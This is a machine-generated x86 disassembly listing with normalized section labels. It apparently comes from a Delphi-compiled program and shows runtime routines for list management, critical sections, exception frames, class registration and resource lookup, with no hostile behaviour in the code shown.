mov edi eax
mov eax [ edi + 0x20 ]
cmp eax [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ edi + 0x20 ] eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebp ebp
mov eax [ edi + 0x4 ]
mov edx ebp
call sub_4189b0
mov ebx eax
mov edx [ esp ]
mov eax ebx
call sub_417680
mov [ ebx + 0x10 ] al
inc ebp
dec esi
jne r-xdata
sub_417894
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403280
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ edi + 0x4 ] eax
lea eax [ edi + 0x8 ]
push eax
call InitializeCriticalSection
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_417564
mov esi eax
mov eax [ edi + 0x4 ]
mov edx esi
call sub_418854
mov [ esi + 0x10 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_417908
push ebx
push esi
push edi
push ebp
call sub_403664
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
mov eax [ esi + 0x4 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
mov eax [ esi + 0x4 ]
call sub_4032b0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4032a0
test bl bl
jle r-xdata
inc ebp
xor edi edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
mov eax [ esi + 0x4 ]
mov edx edi
call sub_4189b0
call sub_4032b0
inc edi
dec ebp
jne r-xdata
sub_417964
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor esi esi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov eax [ ebp + 0x4 ]
mov edx edi
call sub_4189b0
mov edx [ esp ]
push edx
mov ecx esi
mov edx eax
mov eax [ r-xdata ]
call sub_4174f4
mov esi eax
inc edi
dec ebx
jne r-xdata
sub_4179a8
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor edi edi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
test edi edi
jne r-xdata
mov edx [ esp ]
call sub_417620
mov edi eax
inc esi
dec ebx
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx esi
call sub_4189b0
cmp [ eax + 0x10 ] 0x0
je r-xdata
sub_4179ec
push ebp
mov ebp esp
add esp 0xfffffef4
xor eax eax
mov [ ebp - 0x10c ] eax
xor eax eax
push ebp
push sub_417a6f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_403200
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10c ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x10c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb18
call sub_403a64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417a76
lea eax [ ebp - 0x10c ]
call sub_4040ac
retn
sub_417a7c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_417964
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_417488
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_4179ec
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_4189b0
mov edi eax
cmp edi [ ebp - 0x10 ]
je r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4189b0
mov esi eax
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4034c4
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_417964
cmp eax [ ebp - 0x10 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4188a0
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_418854
sub_417b68
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4189b0
mov edx ebp
call sub_41776c
test al al
jne r-xdata
sub_417bac
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_417564
mov edx eax
mov eax [ edi + 0x4 ]
call sub_418854
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4189b0
mov eax [ eax + 0xc ]
mov edx ebp
call sub_418a0c
test eax eax
jge r-xdata
sub_417c08
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4189b0
mov esi eax
mov edx ebp
mov eax esi
call sub_4177a4
mov eax [ esi + 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax esi
call sub_4032b0
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4188a0
sub_417c58
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_403280
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ rw-data ]
call sub_417b44
xor eax eax
push ebp
push sub_417d57
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc esi
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417d5e
mov eax [ rw-data ]
call sub_417bfc
retn
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_418854
inc esi
xor edi edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_4189b0
mov ebx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_417680
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_418854
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_4189b0
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
je r-xdata
sub_417d5e
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_417d84
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_4032b0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4032a0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_417db4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
call sub_417b44
xor edx edx
push ebp
push sub_417e2b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_417bfc
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
call sub_403b10
jmp r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4189b0
mov edx [ ebp - 0x4 ]
call sub_417620
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_417e48
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_417ea8
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb18
call sub_403a64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417eaf
lea eax [ ebp - 0xc ]
call sub_4040ac
retn
sub_417eb4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_417b44
xor eax eax
push ebp
push sub_417efa
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_4179a8
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417f01
mov eax [ rw-data ]
call sub_417bfc
retn
sub_417f08
push ebx
push esi
mov esi eax
mov eax esi
call sub_417eb4
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_417e48
sub_417f28
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_417b44
xor eax eax
push ebp
push sub_417f8d
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_417b68
test al al
je r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_417b50
cmp ebx [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417f94
mov eax [ rw-data ]
call sub_417bfc
retn
mov eax ebx
call sub_40323c
mov ebx eax
sub_417f98
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_417b44
xor eax eax
push ebp
push sub_417fda
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_417c08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417fe1
mov eax [ rw-data ]
call sub_417bfc
retn
sub_417fe4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_417b44
xor eax eax
push ebp
push sub_418026
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_417bac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41802d
mov eax [ rw-data ]
call sub_417bfc
retn
sub_418030
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
call sub_417b44
xor eax eax
push ebp
push sub_418077
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ rw-data ]
call sub_417a7c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41807e
mov eax [ rw-data ]
call sub_417bfc
retn
sub_418084
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_417b44
xor eax eax
push ebp
push sub_4180d2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ rw-data ]
call sub_417848
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4180d9
mov eax [ rw-data ]
call sub_417bfc
retn
sub_418138
push ebp
mov ebp esp
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0xc ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
pop ebp
retn 0x8
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_418170
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_418138
mov edx eax
mov eax [ rw-data ]
call sub_418cec
pop edi
pop esi
pop ebx
retn
sub_41819c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_418d74
mov esi eax
xor edx edx
push ebp
push sub_418206
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418dd8
retn
mov edx ebx
mov eax esi
call sub_4189b0
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0xc ]
mov [ ebp - 0x4 ] eax
call sub_403b10
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_418218
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_418d74
mov esi eax
xor edx edx
push ebp
push sub_418282
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418dd8
retn
mov edx ebx
mov eax esi
call sub_4189b0
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_403b10
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_418294
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
xor eax eax
inc esi
lea ebx [ ecx + 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov al 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebx - 0x4 ]
mov [ edx ] ecx
jmp r-xdata
mov edx edi
mov eax [ ebx ]
call sub_408020
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4182d4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov [ ebp - 0x5 ] 0x0
inc esi
mov ebx [ ebp - 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax edi
mov edx [ ebx + 0x4 ]
call sub_404100
jmp r-xdata
cmp eax [ ebx ]
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_418318
push ebx
push esi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov esi ebx
mov edx esi
mov eax [ rw-data ]
call sub_418a0c
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ rw-data ] eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ rw-data ]
call sub_418854
sub_418370
push ebx
push esi
push edi
mov esi eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ebx [ edx + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4189b0
mov edi eax
mov eax esi
call edi
test eax eax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_4183b0
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_418370
test eax eax
sete al
pop ebx
retn
mov eax ebx
call [ rw-data ]
pop ebx
retn
sub_4183d4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
test ebx ebx
jne r-xdata
push 0xa
mov eax edi
call sub_40456c
push eax
push ebx
call FindResourceA
test eax eax
setne al
test al al
je r-xdata
mov ebx [ rw-data ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push edi
push 0xa
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b75c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_418448
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_41b1f8
mov [ esi ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4032b0
retn
sub_418458
push ebx
call sub_406074
mov ebx [ eax + 0xc ]
test ebx ebx
jne r-xdata
call sub_406074
mov edx [ eax + 0x8 ]
mov eax ebx
call sub_418854
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov ebx eax
call sub_406074
mov [ eax + 0x8 ] ebx
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov ebx eax
call sub_406074
mov [ eax + 0xc ] ebx
sub_4184b0
push ebx
push esi
push edi
call sub_406074
mov edi [ eax + 0x8 ]
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4189b0
mov edx [ eax ]
call [ edx + 0xc ]
inc esi
dec ebx
jne r-xdata
sub_4184e0
push ebx
push esi
call sub_406074
mov eax [ eax + 0x8 ]
call sub_4032b0
call sub_406074
mov ebx [ eax + 0xc ]
mov eax ebx
call sub_418a98
mov esi eax
call sub_406074
mov [ eax + 0x8 ] esi
mov edx [ ebx + 0x8 ]
dec edx
mov eax ebx
call sub_4188a0
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
call sub_406074
xor edx edx
mov [ eax + 0xc ] edx
mov eax ebx
call sub_4032b0
sub_41853c
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4185d2
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
cmp esi [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4185d9
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
mov eax [ ebp + 0x8 ]
cmp esi [ eax - 0x8 ]
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_40323c
call sub_41853c
pop ecx
mov ebx eax
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_403200
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404310
mov eax [ ebp - 0x4 ]
push eax
mov eax esi
call sub_405324
call sub_405374
mov edx eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x4 ]
pop eax
call sub_4183d4
or bl al
sub_4185e4
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_418692
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
sete [ ebp - 0xa ]
cmp [ ebp - 0xa ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_418673
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x4 ]
call sub_4031f8
call sub_41853c
pop ecx
mov [ ebp - 0x9 ] al
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_418458
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41867a
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_4184b0
retn
call sub_4184e0
sub_4186a8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
mov esi edx
push 0x400
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b8e0
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
xor eax eax
push ebp
push sub_418705
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_41ea64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41870c
mov eax [ ebp - 0x4 ]
call sub_4032b0
retn
sub_418714
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax ebx
call sub_4031f8
push eax
mov eax esi
call sub_4031f8
pop edx
cmp edx eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
call sub_419720
push eax
mov eax esi
call sub_419720
pop edx
cmp edx eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_418821
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_4186a8
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_418804
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0xc ]
call sub_4186a8
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_407fac
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41880b
mov eax [ ebp - 0xc ]
call sub_4032b0
retn
mov al 0x1
sub_418834
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_418854
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x8 ]
cmp esi [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax esi
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_4188a0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41893c
cmp esi [ ebx + 0x8 ]
jl r-xdata
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 + 0x4 ]
call sub_4028e8
mov edx esi
mov eax ebx
call sub_4189b0
mov edi eax
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cl 0x2
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_418904
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_418900
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb18
jmp sub_403a64
sub_41893c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_418984
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_405e08
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax [ r-xdata ]
call sub_418904
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41898b
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_4189b0
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41893c
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + esi * 4 ]
pop esi
pop ebx
retn
sub_4189d8
mov edx [ eax + 0xc ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov ecx edx
test ecx ecx
jns r-xdata
mov ecx 0x4
mov ecx 0x10
jmp r-xdata
sar ecx 0x2
jmp r-xdata
add ecx 0x3
add ecx edx
mov edx ecx
call sub_418b6c
retn
sub_418a0c
push ebx
xor ecx ecx
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jge r-xdata
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov ebx [ eax + 0x4 ]
cmp edx [ ebx + ecx * 4 ]
jne r-xdata
mov eax ecx
pop ebx
retn
or ecx 0xffffffff
inc ecx
sub_418a2c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41893c
cmp esi [ ebx + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 + 0x4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 ]
call sub_4028e8
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
